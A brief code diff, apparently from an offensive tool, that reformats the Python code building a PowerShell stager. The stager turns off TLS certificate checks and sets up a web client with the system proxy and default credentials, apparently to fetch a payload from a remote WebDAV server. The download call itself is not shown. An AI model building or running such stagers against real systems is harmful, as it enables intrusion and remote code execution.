@@ -88,10 +88,11 @@ webdav_url = '%s://%s:%d/webdav' % (
     args.WEBDAV_PORT,
 )
 
-stager_str = ((
-    "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
-    "={$true};" if args.SSL_KEY else "") +
+stager_str = (
     (
+        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
+        "={$true};" if args.SSL_KEY else ""
+    ) + (
         "$K=new-object net.webclient;"
         "$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
         "$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
